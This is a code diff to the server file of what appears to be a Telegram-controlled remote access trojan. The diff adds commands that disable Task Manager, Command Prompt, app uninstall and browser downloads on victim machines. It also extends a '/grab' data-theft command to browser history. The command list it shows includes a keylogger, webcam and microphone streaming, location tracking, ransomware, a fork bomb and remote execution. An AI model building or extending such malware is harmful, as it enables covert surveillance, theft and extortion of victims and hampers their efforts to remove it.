@@ -1,5 +1,6 @@
-# app.py (v43.0_PAGINATION_UPDATE)
-# - MODIFIED: Implemented pagination for the /list command to handle a large number of agents without hitting Telegram's message limit.
+# app.py (v43.1_LOCKDOWN_CMD_UPDATE)
+# - ADDED: All new system lockdown commands (/disabletaskmgr, /restorecmd, etc.) to the generic command handler.
+# - MODIFIED: Updated the /help menu with a new "System Lockdown" section to list the new commands.
 
 import os
 import re
@@ -210,16 +211,25 @@ async def cmd_help(update: Update, context: ContextTypes.DEFAULT_TYPE):
         "  <i>Effects: invert, noise, lines, color_squares</i>\n"
         "<code>/stopflashscreen</code> - Stop the visual effect\n"
         "<code>/jumpscare</code> - 👻 Run the bundled jumpscare executable\n\n"
-        "<b>🚫 LOCKDOWN & CONTROL (Admin)</b>\n"
+        "<b>🚫 INPUT & WEBSITE CONTROL (Admin)</b>\n"
         "<code>/blockwebsite &lt;url&gt;</code> - Block website access\n"
         "<code>/unblockwebsite &lt;domain&gt;</code> - Unblock a website\n"
         "<code>/blockkeyboard</code> - Disable keyboard input\n"
         "<code>/unblockkeyboard</code> - Enable keyboard input\n"
         "<code>/blockmouse</code> - Disable mouse input\n"
         "<code>/unblockmouse</code> - Enable mouse input\n\n"
+        "<b>🛡️ SYSTEM LOCKDOWN (Admin)</b>\n"
+        "<code>/disabletaskmgr</code> - Disable Task Manager\n"
+        "<code>/restoretaskmgr</code> - Restore Task Manager\n"
+        "<code>/disablecmd</code> - Disable Command Prompt\n"
+        "<code>/restorecmd</code> - Restore Command Prompt\n"
+        "<code>/disableuninstall</code> - Disable App Uninstall\n"
+        "<code>/restoreuninstall</code> - Restore App Uninstall\n"
+        "<code>/disablebrowserdownloads</code> - Block browser file downloads\n"
+        "<code>/restorebrowserdownloads</code> - Restore browser file downloads\n\n"
         "<b>🔑 DATA EXFILTRATION</b>\n"
-        "<code>/grab &lt;type&gt;</code> - Steal data (discord, wifi,)\n"
-        "  <i>Types: all, discord, wifi</i>\n\n"
+        "<code>/grab &lt;type&gt;</code> - Steal data (discord, wifi, history, etc.)\n"
+        "  <i>Types: all, discord, wifi, history</i>\n\n"
         "<b>📁 FILE SYSTEM</b>\n"
         "<code>/ls</code> - List files\n"
         "<code>/cd &lt;dir&gt;</code> - Change directory\n"
@@ -242,7 +252,17 @@ ptb_app.add_handler(CommandHandler("target", cmd_target))
 ptb_app.add_handler(CommandHandler("destroy", cmd_destroy))
 ptb_app.add_handler(CommandHandler("upload", cmd_upload))
 
-agent_commands = ["info", "exec", "ss", "cam", "getexactlocation", "startkeylogger", "stopkeylogger", "livestream", "stoplivestream", "livecam", "stoplivecam", "livemic", "stoplivemic", "grab", "ls", "cd", "download", "pwd", "blockkeyboard", "unblockkeyboard", "blockmouse", "unblockmouse", "forkbomb", "cancelforkbomb", "ransomware", "restore", "tts", "blockwebsite", "unblockwebsite", "flashscreen", "stopflashscreen", "jumpscare", "startchat", "sendchat", "stopchat"]
+agent_commands = [
+    "info", "exec", "ss", "cam", "getexactlocation", "startkeylogger", "stopkeylogger", 
+    "livestream", "stoplivestream", "livecam", "stoplivecam", "livemic", "stoplivemic", 
+    "grab", "ls", "cd", "download", "pwd", "blockkeyboard", "unblockkeyboard", "blockmouse", 
+    "unblockmouse", "forkbomb", "cancelforkbomb", "ransomware", "restore", "tts", 
+    "blockwebsite", "unblockwebsite", "flashscreen", "stopflashscreen", "jumpscare", 
+    "startchat", "sendchat", "stopchat",
+    # New Lockdown Commands
+    "disabletaskmgr", "restoretaskmgr", "disablecmd", "restorecmd", "disableuninstall", 
+    "restoreuninstall", "disablebrowserdownloads", "restorebrowserdownloads"
+]
 for cmd in agent_commands: ptb_app.add_handler(CommandHandler(cmd, generic_command_handler))
 
 # --- Main Webhook Endpoint ---
